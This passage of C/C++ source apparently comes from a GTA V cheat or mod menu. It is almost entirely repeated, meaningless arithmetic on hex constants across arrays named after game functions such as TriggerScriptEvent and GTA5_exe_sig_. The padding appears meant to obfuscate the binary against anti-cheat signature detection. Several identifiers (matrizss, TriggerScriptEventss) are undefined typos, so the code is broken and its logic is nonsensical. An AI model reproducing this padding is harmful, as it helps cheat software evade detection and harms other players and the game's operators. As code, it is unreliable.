			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
